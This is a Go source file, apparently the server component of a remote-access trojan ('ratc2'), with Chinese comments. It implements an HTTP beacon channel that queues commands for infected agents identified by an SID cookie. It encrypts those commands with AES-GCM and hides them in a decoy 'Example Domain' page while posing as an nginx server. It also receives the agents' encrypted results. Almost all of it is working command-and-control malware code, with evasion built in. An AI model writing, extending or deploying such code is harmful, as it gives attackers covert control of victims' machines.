// beacon.go — Agent HTTP 轮询信道（协议 §8）
// GET /   ：下发命令（伪装 HTML，<div id="token">base64(AES-GCM 命令块)</div>）
// POST /submit：接收结果（form data=base64(AES-GCM 结果块)）
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"

	"ratc2/internal/protocol"
	"ratc2/server/internal/session"
)

const (
	beaconAddr = "0.0.0.0:8080"
	// 伪装 HTML 模板：token div 内含 base64 密文（无命令时为空）
	beaconHTML = "<!DOCTYPE html><html><head><title>Example Domain</title></head>" +
		"<body><h1>Example Domain</h1><p>This domain is for use in illustrative examples.</p>" +
		"<div id=\"token\">%s</div></body></html>"
)

// BeaconCmd 一条待下发的命令
type BeaconCmd struct {
	Seq     uint32
	Cmd     uint16
	Payload []byte
}

// BeaconResult 一条结果（协议 §8.5 TLV）
type BeaconResult struct {
	Seq    uint32
	Status uint8
	Result []byte
}

// BeaconQueue 每 agent 的待下发命令队列（并发安全）
type BeaconQueue struct {
	mu  sync.Mutex
	q   map[string][]BeaconCmd
	seq atomic.Uint32
}

func NewBeaconQueue() *BeaconQueue {
	return &BeaconQueue{q: make(map[string][]BeaconCmd)}
}

// Push 入队并返回命令序号（结果回传按它关联 relay）。
func (bq *BeaconQueue) Push(agentID string, cmd uint16, payload []byte) uint32 {
	seq := bq.seq.Add(1)
	bq.mu.Lock()
	bq.q[agentID] = append(bq.q[agentID], BeaconCmd{Seq: seq, Cmd: cmd, Payload: payload})
	bq.mu.Unlock()
	return seq
}

// PopAll 取走该 agent 的全部待下发命令。
func (bq *BeaconQueue) PopAll(agentID string) []BeaconCmd {
	bq.mu.Lock()
	cmds := bq.q[agentID]
	bq.q[agentID] = nil
	bq.mu.Unlock()
	return cmds
}

// ---- TLV 编解码（协议 §8.4/§8.5，little-endian）----

func encodeCommands(cmds []BeaconCmd) []byte {
	var buf bytes.Buffer
	binary.Write(&buf, binary.LittleEndian, uint32(len(cmds)))
	for _, c := range cmds {
		binary.Write(&buf, binary.LittleEndian, c.Seq)
		binary.Write(&buf, binary.LittleEndian, c.Cmd)
		binary.Write(&buf, binary.LittleEndian, uint32(len(c.Payload)))
		buf.Write(c.Payload)
	}
	return buf.Bytes()
}

func decodeResults(b []byte) ([]BeaconResult, error) {
	r := bytes.NewReader(b)
	var count uint32
	if err := binary.Read(r, binary.LittleEndian, &count); err != nil {
		return nil, err
	}
	out := make([]BeaconResult, 0, count)
	var err error
	for i := uint32(0); i < count; i++ {
		var br BeaconResult
		if err = binary.Read(r, binary.LittleEndian, &br.Seq); err != nil {
			return nil, err
		}
		if br.Status, err = r.ReadByte(); err != nil {
			return nil, err
		}
		var ln uint32
		if err := binary.Read(r, binary.LittleEndian, &ln); err != nil {
			return nil, err
		}
		br.Result = make([]byte, ln)
		if _, err := r.Read(br.Result); err != nil {
			return nil, err
		}
		out = append(out, br)
	}
	return out, nil
}

// ---- HTTP 端点 ----

// beaconAgentID 从 Cookie SID 提取 agent_id（hex → 16B），非法返回 nil。
func beaconAgentID(r *http.Request) ([]byte, string) {
	c, err := r.Cookie("SID")
	if err != nil {
		return nil, ""
	}
	id, err := hex.DecodeString(c.Value)
	if err != nil || len(id) != 16 {
		return nil, ""
	}
	return id, c.Value
}

// startBeaconServer 启动 HTTP 监听（独立 goroutine）。
func startBeaconServer(psk []byte, reg *session.Registry, relays *RelayMap, queue *BeaconQueue) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if !strings.HasPrefix(r.URL.Path, "/") {
			w.WriteHeader(404)
			return
		}
		agentID, idHex := beaconAgentID(r)
		if agentID == nil {
			w.WriteHeader(400)
			return
		}
		key := protocol.BeaconKey(psk, agentID)
		switch r.Method {
		case http.MethodGet:
			handleBeaconGet(w, idHex, key, reg, queue)
		case http.MethodPost:
			if r.URL.Path != "/submit" {
				w.WriteHeader(404)
				return
			}
			handleBeaconPost(w, r, idHex, key, reg, relays)
		default:
			w.WriteHeader(405)
		}
	})
	srv := &http.Server{Addr: beaconAddr, Handler: mux}
	ln, err := net.Listen("tcp", beaconAddr)
	if err != nil {
		log.Fatalf("beacon listen %s: %v", beaconAddr, err)
	}
	log.Printf("beacon http listening on %s", beaconAddr)
	if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		log.Printf("beacon server: %v", err)
	}
}

// handleBeaconGet：注册/刷新会话，取命令队列加密后嵌入伪装 HTML。
func handleBeaconGet(w http.ResponseWriter, idHex string, key []byte,
	reg *session.Registry, queue *BeaconQueue) {
	// 注册或刷新会话（首次见 → 新建 Beacon 会话）
	s := reg.Get(idHex)
	if s == nil {
		s = &session.Session{
			ID:      idHex,
			Role:    session.RoleAgent,
			Key:     key,
			IP:      "beacon",
			OSInfo:  "beacon-agent",
			Online:  true,
			Beacon:  true,
		}
		reg.Register(s)
		// 必须立即刷新 LastSeen：否则 SweepLoop 会把零值时间戳判为超时，
		// 5 秒内回收刚注册的会话（表现为反复 "first GET"、sessions 永空）
		s.Touch()
		log.Printf("[beacon] %s registered (first GET)", idHex)
	} else {
		s.Touch()
	}

	// 取命令 → 加密 → base64
	cmds := queue.PopAll(idHex)
	token := ""
	if len(cmds) > 0 {
		log.Printf("[beacon] %s took %d cmds", idHex, len(cmds))
		plain := encodeCommands(cmds)
		sealed, err := protocol.EncryptPayload(key, plain)
		if err != nil {
			w.WriteHeader(500)
			return
		}
		token = base64.StdEncoding.EncodeToString(sealed)
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Server", "nginx")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(beaconHTMLtemplate(token)))
}

// handleBeaconPost：解密结果块，按 (agent_id, seq) 关联 relay 回传 ctl。
func handleBeaconPost(w http.ResponseWriter, r *http.Request, idHex string, key []byte,
	reg *session.Registry, relays *RelayMap) {
	sealed, err := base64.StdEncoding.DecodeString(r.FormValue("data"))
	if err != nil {
		w.WriteHeader(400)
		return
	}
	plain, err := protocol.DecryptPayload(key, sealed)
	if err != nil {
		log.Printf("[beacon] %s: decrypt results: %v", idHex, err)
		w.WriteHeader(400)
		return
	}
	results, err := decodeResults(plain)
	if err != nil {
		log.Printf("[beacon] %s: decode results: %v", idHex, err)
		w.WriteHeader(400)
		return
	}
	log.Printf("[beacon] %s posted %d results", idHex, len(results))
	for _, res := range results {
		if e, ok := relays.Take(idHex, res.Seq); ok {
			// 回传发起命令的 ctl：payload = req_seq + status + result
			p := buildResultPayload(e.cliSeq, res.Status, res.Result)
			if err := reply(e.cli, e.cliKey, e.cliSeq, protocol.CmdResult,
				protocol.PluginSys, protocol.StatusOK, p); err != nil {
				log.Printf("[beacon] %s: relay result to ctl failed: %v", idHex, err)
			}
		} else {
			log.Printf("[beacon] %s: result for unknown relay seq=%d", idHex, res.Seq)
		}
	}
	if s := reg.Get(idHex); s != nil {
		s.Touch()
	}
	w.WriteHeader(http.StatusOK)
}

// buildResultPayload 组装 CMD_RESULT payload（req_seq u32 + status u8 + result）。
func buildResultPayload(reqSeq uint32, status uint8, result []byte) []byte {
	out := make([]byte, 0, 5+len(result))
	out = binary.LittleEndian.AppendUint32(out, reqSeq)
	out = append(out, status)
	out = append(out, result...)
	return out
}

// beaconHTMLtemplate 用 token 值填充伪装页面（无命令时 div 为空）。
func beaconHTMLtemplate(token string) string {
	if token == "" {
		return "<!DOCTYPE html><html><head><title>Example Domain</title></head>" +
			"<body><h1>Example Domain</h1><p>This domain is for use in illustrative examples.</p></body></html>"
	}
	return strings.Replace(beaconHTML, "%s", token, 1)
}

